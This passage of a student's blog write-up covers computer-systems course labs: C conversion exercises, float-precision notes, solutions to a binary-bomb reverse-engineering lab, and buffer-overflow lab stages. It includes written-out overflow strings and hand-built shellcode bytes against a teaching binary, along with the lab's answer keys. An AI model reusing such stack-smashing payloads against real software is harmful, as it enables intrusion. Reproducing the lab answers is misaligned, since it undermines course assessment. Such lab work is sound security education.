class="keyword">char</span> str[<span class="number">100</span>];</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, str);</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(str); i++) &#123;</span><br><span class="line">                res = res * <span class="number">10</span> + (str[i] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;int: %d\n&quot;</span>, res);</span><br><span class="line">        assert(res == atoi(str));</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;float.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> str[<span class="number">100</span>];</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, str);</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">int</span> len = <span class="built_in">strlen</span>(str);</span><br><span class="line">        <span class="keyword">double</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; len &amp;&amp; str[i] != <span class="string">&#x27;.&#x27;</span>; i++) &#123;</span><br><span class="line">                res = res * <span class="number">10</span> + (str[i] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">double</span> t = <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">for</span>(i = i+<span class="number">1</span>; i &lt; len; i++,t*=<span class="number">10</span>) &#123;</span><br><span class="line">                res += (str[i] - <span class="string">&#x27;0&#x27;</span>) / t;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;double: %lf\n&quot;</span>, res);</span><br><span class="line">        <span class="keyword">double</span> atod = atof(str);</span><br><span class="line">        assert(<span class="built_in">fabs</span>(res - atod) &lt;= <span class="number">1e-5</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li><strong>编写函数cs_itoa/cs_ftoa  （正数/浮点数转字符串）</strong><br>字符串限定为十进制，处理效果同printf</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> *  <span class="title">itoa</span> <span class="params">( <span class="keyword">int</span> value, <span class="keyword">char</span> * str, <span class="keyword">int</span> base )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">char</span> c[<span class="number">100</span>];</span><br><span class="line">        c[<span class="number">99</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="keyword">int</span> num = <span class="number">98</span>;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;i);</span><br><span class="line">        <span class="keyword">while</span>(i != <span class="number">0</span>) &#123;</span><br><span class="line">                c[num--] = i % <span class="number">10</span> + <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                i /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, &amp;c[num+<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;float.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> * <span class="title">itoa</span><span class="params">(<span class="keyword">int</span> value, <span class="keyword">char</span> * str, <span class="keyword">int</span> base)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">double</span> d;</span><br><span class="line">        <span class="keyword">char</span> c[<span class="number">100</span>];</span><br><span class="line">        c[<span class="number">99</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="keyword">int</span> num = <span class="number">98</span>;</span><br><span class="line">        <span class="keyword">int</span> time = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lf&quot;</span>, &amp;d);</span><br><span class="line">        <span class="keyword">while</span>(<span class="built_in">fabs</span>((<span class="keyword">double</span>)((<span class="keyword">long</span> <span class="keyword">long</span>)(d*<span class="number">10</span>)/<span class="number">10</span>) - d) &gt; DBL_EPSILON) &#123;</span><br><span class="line">                <span class="comment">// still have .</span></span><br><span class="line">                d *= <span class="number">10</span>;</span><br><span class="line">                time++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> l = (<span class="keyword">long</span> <span class="keyword">long</span>) d;</span><br><span class="line">        <span class="keyword">while</span>(l != <span class="number">0</span>) &#123;</span><br><span class="line">                c[num--] = l % <span class="number">10</span> + <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                time--;</span><br><span class="line">                <span class="keyword">if</span>(time == <span class="number">0</span>) &#123;</span><br><span class="line">                        c[num--] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">                        time--;</span><br><span class="line">                &#125;</span><br><span class="line">                l /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, &amp;c[num+<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="5"><li><strong>浮点数比较</strong></li></ol><p><a href="https://bot-man-jl.github.io/articles/?post=2020/Comparing-Floating-Point-Numbers">如何比较两个浮点数</a></p><p>对于浮点数：<strong>除了能用2的指数幂乘以整数表示的浮点数能够被精确的表示外，其余的浮点数都是近似表示的。</strong></p><p>使用fabs来求绝对值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="built_in">fabs</span>(f1 - f2) &lt;= <span class="number">1e-6</span>) &#123;  <span class="comment">//equal</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 或者使用 float.h 中的 FLT_ESPILON(1.1920929e-7) | DBL_EPSILON(2.22045e-16)</span></span><br></pre></td></tr></table></figure><p>错误：</p><p><img src="/2021/computer-architecture-hitlabs/10.png"></p><p>1）abs() 函数传入浮点数时：abs会把该浮点数解释为int，因此数字可能会变得很大。</p><p>2）fabs() 结果错误：没有包含头文件 stdlib.h，运行没有报错，返回0。</p><p>单精度数7位有效数字。 （float）<br>双精度数16位有效数字。（double）</p><p>单精度数的尾数用23位存储，加上默认的小数点前的1位1，2^(23+1) = 16777216。因为 10^7 &lt; 16777216 &lt; 10^8，所以说单精度浮点数的有效位数是7位。 双精度的尾数用52位存储，2^(52+1) = 9007199254740992，10^16 &lt; 9007199254740992 &lt; 10^17，所以双精度的有效位数是16位</p><p>单精度浮点数的实际有效精度为24位二进制，这相当于 24*log102≈7.2 位10进制的精度，所以平时我们说“单精度浮点数具有7位精度”。（精度的理解：当从1.000…02变化为1.000…12时，变动范围为 2-23，考虑到因为四舍五入而得到的1倍精度提高，所以单精度浮点数可以反映2-24的数值变化，即24位二进制精度）</p><p><a href="https://blog.csdn.net/github_33873969/article/details/78040129">C语言的int, float,double相互转化（从本质上理解可能的问题）</a></p><p><img src="https://img-blog.csdn.net/20170920213214857?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2l0aHViXzMzODczOTY5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast"></p><h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><ol><li>codeblocks 调试时不停下。</li></ol><p>原因一、project中文路径。</p><p>原因二、codeblocks 版本与 gcc gdb 不兼容。</p><ol start="2"><li><p>gdb调试时查看全局变量内存，使用命令： x /x x</p><p>Cannot access memory at address 0xffffffffb90efc69.</p></li></ol><p>原因：x命令后接地址，直接写x代表你要访问(x)的内容，自然报错。正确：x /x &amp;x</p><h2 id="收获-1"><a href="#收获-1" class="headerlink" title="收获"></a>收获</h2><ol><li>学会了如何用gdb, objdump来调试程序、观察程序信息。</li><li>练习了寻找和整理有效信息的能力。</li><li>对浮点数的二进制表示有了更深的理解。</li><li>对unicode字符集、utf编码、ANSI、ASCII、GBK编码有了较为全面的了解。</li><li>了解了不同变量在内存中的存储位置和内存的段分布。</li></ol><h1 id="实验三-Bomb"><a href="#实验三-Bomb" class="headerlink" title="实验三 Bomb"></a>实验三 Bomb</h1><h2 id="phase-1"><a href="#phase-1" class="headerlink" title="phase 1"></a>phase 1</h2><p>b 74</p><p>进入phase_1:</p><p><img src="/2021/computer-architecture-hitlabs/image-20210421174611067.png"></p><p>推测拆弹密码字符串的存储地址为<code>$0x403150</code>，因为调用<code>strings_not_equal</code>前有把该地址放入esi寄存器的语句。</p><p>以字符串形式查看该地址内容，得到：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210421175019595.png"></p><h2 id="phase-2"><a href="#phase-2" class="headerlink" title="phase 2"></a>phase 2</h2><p>b 82</p><p>I am just a renegade hockey mom.</p><p>进入phase_2:</p><p><img src="/2021/computer-architecture-hitlabs/image-20210421175354138.png"></p><p>进入read_six_number:</p><p><img src="/2021/computer-architecture-hitlabs/image-20210422143204775.png"></p><p>可知read_six_number用来处理输入，输入格式为”%d %d %d %d %d %d”。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210422134321868.png"></p><p>根据汇编代码可推断出输入数字的规律。</p><h2 id="phase-3"><a href="#phase-3" class="headerlink" title="phase 3"></a>phase 3</h2><p>1 2 4 7 11 16</p><p>b 89</p><p>进入phase_3:</p><p><img src="/2021/computer-architecture-hitlabs/image-20210422144049874.png"></p><p>可知输入形式为”%d %c %d”。</p><p>测试输入<code>1 c 0</code></p><p><img src="/2021/computer-architecture-hitlabs/image-20210422145054755.png"></p><p>可知 <code>0xc(%rsp)</code> 处存的是第一个输入数字。<code>cmp $0x7, %eax</code> 表明该数字不能大于7。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210422145421416.png"></p><p>接下来看位于<code>0x8(%rsp)</code>的第二个数字是否等于0x368 = 872。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210422150618945.png"></p><p>由第三步比较可得需要输入的字符为’t’。</p><h2 id="phase-4"><a href="#phase-4" class="headerlink" title="phase 4"></a>phase 4</h2><p>1 t 872</p><p>b 95</p><p>进入phase_4:</p><p><img src="/2021/computer-architecture-hitlabs/image-20210422150922762.png"></p><p>同理得，需要输入的是两个数字。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210422151719517.png"></p><p>继续往下，可知第二q个数字需要在[2, 4]中。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210422202835800.png"></p><p>看 func4 函数返回时的汇编代码得输入的第一个数字需要与eax相等。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210422204740646.png"></p><p>从func4退出时，rax的值为0xa2。(在第二个输入数字为3的情况下)</p><p><img src="/2021/computer-architecture-hitlabs/image-20210422152712885.png"></p><p><img src="/2021/computer-architecture-hitlabs/image-20210422153036291.png"></p><p>esi 中存放输入的第二个数字，edi的初始值为8。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210422153344590.png"></p><p>将edi与1比较，若相等则跳到<code>mov %esi, %eax</code>。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210422153609671.png"></p><p>func4函数内部会将参数减一，调用自己。进入第二个func4函数栈时，edi == 7。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210422153909104.png"></p><p>一直到参数为1。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210422154208393.png"></p><p>由此可以写出func4的框架：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func4</span><span class="params">(<span class="keyword">int</span> n)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> 输入的第二个数字</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">int</span> res1 = func(n<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">int</span> res2 = func(n<span class="number">-2</span>);</span><br><span class="line">        <span class="keyword">return</span> res1 + res2 + 输入的第二个数字</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将输入的第二个数字记为②，得到func4最终的返回值为：</p><table><thead><tr><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th></tr></thead><tbody><tr><td>②</td><td>2②</td><td>4②</td><td>7②</td><td>12②</td><td>20②</td><td>33②</td><td>54②</td></tr></tbody></table><p>只要满足输入数字：① = 54 ②。</p><h2 id="phase-5"><a href="#phase-5" class="headerlink" title="phase 5"></a>phase 5</h2><p>162 3</p><p>b 101</p><p>同理查看scanf参数得到需要的为两个数字(“%d %d”)。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210422214403157.png"></p><p>当eax二进制后4位为1111时，跳入phase_5+91。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210422214132046.png"></p><p>edx 的最后4位需要为0xf，输入的第二个数字需要与ecx相等。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210422215036187.png"></p><p>输入的第一个数字后四位不为1111时，执行phase_4之后代码，可得rax是访问数组的下标。</p><p><code>mov %eax, 0xc(%rsp)</code>: 用array[①] 的值覆盖①的位置。</p><p><code>add %eax, %ecx</code>: 将该数组值加入ecx。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210422220110768.png"></p><p>由此可得，最终的结果是从下标为①开始执行上述主要操作15次后，rax的值为15，经过的累加和(ecx)则为②。</p><p>根据array的值，可得5 115。</p><h2 id="phase-6"><a href="#phase-6" class="headerlink" title="phase 6"></a>phase 6</h2><p>5 115</p><p>b 108</p><p>进入phase_6，由read_six_number函数可知需要输入的是六个数字。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210423074937411.png"></p><p>查看rsp处内容可知：函数将输入的六个数字(1 2 3 4 5 6)放在了rsp+0x30处。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210423075339517.png"></p><p>对应汇编代码中的位置表明rax用来选定某一个数字。</p><p>分析phase_6的汇编代码，可得：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210423081019406.png"></p><p>由此可以推断出函数的第一部分为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span>(input[i] - <span class="number">1</span> &gt; <span class="number">5</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j = i+<span class="number">1</span>; j &lt; <span class="number">6</span>; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(input[i] == input[j]) <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终结果其中一个要求输入为两两不相等的六个小于7的数字（即123456的一个排列）。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210423085247725.png"></p><p><img src="/2021/computer-architecture-hitlabs/image-20210423090018665.png"></p><p>分析可得，函数遍历输入的每一个数字，每次eax都从1到6递增，当遍历到的第i个数等于eax，则把对应的ebp的值（nodei地址）存入栈rsp+8(i-1)中，ebp随eax变化而变化，变为下一个节点（next）地址。</p><p>例如，假设输入为3 1 2 5 6 4，则栈顶node地址排列也是3 1 2 5 6 4。</p><p>接下来，将node序列按照这个顺序重新连接（改变每一个node的next域为序列中的下一个）。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210423141118889.png"></p><p><img src="/2021/computer-architecture-hitlabs/image-20210423141414546.png"></p><p>最终接受的结果为：所有相邻的节点，前一个节点（rbx）的value比当前节点的value（eax）值小（即排序）。</p><p>各节点value分别为：738、323、138、191、148、584。</p><p>则从小到大排序index为3-&gt;5-&gt;4-&gt;2-&gt;6-&gt;1。</p><p>因此输入的数字应该为 3 5 4 2 6 1。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210423143414354.png"></p><h2 id="隐藏关卡"><a href="#隐藏关卡" class="headerlink" title="隐藏关卡"></a>隐藏关卡</h2><p>在 phase_defused 函数中：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210422211257809.png"></p><p>当在第四关输入后附加特定字符串时，进入隐藏关卡。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210423145041470.png"></p><p>由此可知特定字符串是DrEvil。</p><p>但需要当0x40576c处的值(num_input_string)等于6时才会进入(即解开前面全部六关后)。</p><p>secret_phase汇编代码：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210422211430054.png"></p><p>由atoi函数可知需要输入的是一个整数。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210423151243541.png"></p><p>这个整数减去一后需要不比0x3e8(1000)大。</p><p>接着会进入一个fun7函数，得到的返回值应该为6。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210423151600870.png"></p><p>进入fun7：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210423163239565.png"></p><p>当输入的数字比rdi指向的数字大时，rdi加上0x10递归，返回时将得到的值乘以2加一；小时，rdi加上0x8递归，返回时将得到的值乘以；若相等则返回0。</p><p>需要最终返回值为6则可以经过0-&gt;1-&gt;3-&gt;6。其中大小变化为 小于-&gt;大于-&gt;大于-&gt;相等。一步步输入值测试得到最终的”相等”为0x23(35)。</p><p>全部完成：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210423162943384.png"></p><h2 id="收获-2"><a href="#收获-2" class="headerlink" title="收获"></a>收获</h2><ol><li>练习了如何使用gdb来调试程序。</li><li>学习了edb的使用方法。</li><li>更深地理解的不同结构的c代码生成的汇编代码。</li><li>学会了如何通过查看内存和寄存器变化来反推程序代码。</li><li>通过实践真正理解了各种数据的存储位置和访问方式。</li></ol><h1 id="实验四"><a href="#实验四" class="headerlink" title="实验四"></a>实验四</h1><p>32位 with ebp</p><h2 id="smoke"><a href="#smoke" class="headerlink" title="smoke"></a>smoke</h2><p>生成cookie：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210428161046341.png"></p><p><img src="/2021/computer-architecture-hitlabs/image-20210428161418480.png"></p><p>smoke 地址：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210428165538996.png"></p><p>攻击字符串的大小应该是0x28+4+4=48个字节。攻击字符串的最后4字节应是smoke函数的地址0x08048bbb。(小端模式写入)</p><p>00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 bb 8b 04 08</p><p>成功：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210428173923240.png"></p><h2 id="Fizz"><a href="#Fizz" class="headerlink" title="Fizz"></a>Fizz</h2><p>fizz的地址为0x08048be8，参数应该存在 %ebp + 8 的位置。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210428180037175.png"></p><p>从getbuf弹出返回值后，esp指向(返回地址-4)的位置。</p><p>第五行汇编代码不是将0x804e158放入edx，而是将在0x804e158这个地址的数放入。若代表立即数，会在数前面加上$。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210428225717486.png"></p><p>成功：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210428224608219.png"></p><h2 id="Bang"><a href="#Bang" class="headerlink" title="Bang"></a>Bang</h2><p>查看bang函数内部：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210429151703502.png"></p><p>可知全局变量存在 0x0804e160 的位置，要等于cookie值。</p><p>写出设置全局变量的汇编代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov 0x804e158, %eax</span><br><span class="line">mov %eax, 0x804e160</span><br><span class="line">pushl $0x08048c39</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>通过下面两条命令来生成汇编代码的机器代码。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -c asm.s</span><br><span class="line">objdump -d asm.o</span><br></pre></td></tr></table></figure><p>构造一个包含十二个四字节串的字符串，前面为生成的机器指令（生成顺序），最后四个字节为buf数组的地址（小端顺序）。</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a1 <span class="number">58</span> e1 <span class="number">04</span> <span class="number">08</span></span><br><span class="line">a3 <span class="number">60</span> e1 <span class="number">04</span> <span class="number">08</span></span><br><span class="line"><span class="number">68</span> <span class="number">39</span> <span class="number">8</span>c <span class="number">04</span> <span class="number">08</span></span><br><span class="line">c3</span><br><span class="line"><span class="number">30</span> <span class="number">30</span> <span class="number">30</span> <span class="number">30</span></span><br><span class="line"><span class="number">30</span> <span class="number">30</span> <span class="number">30</span> <span class="number">30</span></span><br><span class="line"><span class="number">30</span> <span class="number">30</span> <span class="number">30</span> <span class="number">30</span></span><br><span class="line"><span class="number">30</span> <span class="number">30</span> <span class="number">30</span> <span class="number">30</span></span><br><span class="line"><span class="number">30</span> <span class="number">30</span> <span class="number">30</span> <span class="number">30</span></span><br><span class="line"><span class="number">30</span> <span class="number">30</span> <span class="number">30</span> <span class="number">30</span></span><br><span class="line"><span class="number">30</span> <span class="number">30</span> <span class="number">30</span> <span class="number">30</span></span><br><span class="line">e8 <span class="number">2f</span> <span class="number">68</span> <span class="number">55</span>   # 返回地址，即插入的机器代码的地址</span><br></pre></td></tr></table></figure><p>成功：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210429201658050.png"></p><blockquote><p><img src="/2021/computer-architecture-hitlabs/image-20210429154914764.png"></p><p>assembly language source files in Unix are traditionally named <code>.s</code>, or <code>.S</code> (capital S, remember Unix filenames are case sensitive) if they are to be passed through the C preprocessor. (C-style macro and include expansion are handled by the C preprocessor, not by the assembler itself, which is why it doesn’t work when you run <code>as</code> directly.)</p><p>Files not otherwise recognized are assumed to be object files to be passed to the linker, but since you specified <code>-c</code>, the linker is not to be run, so <code>gcc</code> thinks there is nothing to do.</p><p>正确：加上后缀.S</p><p><img src="/2021/computer-architecture-hitlabs/image-20210429155136028.png"></p></blockquote><p>注意：若使用call的汇编指令，bufbomb会产生 segmentation fault。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210429202957431.png"></p><h2 id="boom"><a href="#boom" class="headerlink" title="boom"></a>boom</h2><p>与第三阶段同理，返回时回到test原本保存的返回地址，需要注意的是需要把test的ebp还原。汇编代码如下：</p><p><img src="/2021/computer-architecture-hitlabs/image-20210429205135658.png"></p><p>构造的字符串为</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">b8 <span class="number">48</span> <span class="number">3</span>e e9 <span class="number">25</span></span><br><span class="line">bd <span class="number">30</span> <span class="number">30</span> <span class="number">68</span> <span class="number">55</span></span><br><span class="line"><span class="number">68</span> a7 <span class="number">8</span>c <span class="number">04</span> <span class="number">08</span></span><br><span class="line">c3</span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">e8 <span class="number">2f</span> <span class="number">68</span> <span class="number">55</span></span><br></pre></td></tr></table></figure><blockquote><p>问题：汇编代码使用内存地址赋值时失败。</p><p>原因：生成的机器代码将call变为e8，代表跳至相对地址处，rip不同则不同。</p><p>避开使用call还可以这么实现：</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">movl $0x804204e, %eax</span><br><span class="line">jmp *%eax</span><br></pre></td></tr></table></figure></blockquote><h2 id="Nitro"><a href="#Nitro" class="headerlink" title="Nitro"></a>Nitro</h2><p>在getbufn函数打断点，每次执行查看ebp的值，发现是差为0x18的等差数列。</p><p><img src="/2021/computer-architecture-hitlabs/image-20210430213035638.png"></p><p>同时记下testn的返回地址，在汇编代码中最后跳转，恢复原来的位置。</p><p>验证：在testn的汇编代码中有</p><p><img src="/2021/computer-architecture-hitlabs/image-20210505093440581.png"></p><p>由于testn和getbufn的栈是连续的，从getbufn返回后，二者没有变化，esp和ebp的差值确实为0x18。</p><p>完整汇编代码为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">movl $0x25e93e48, 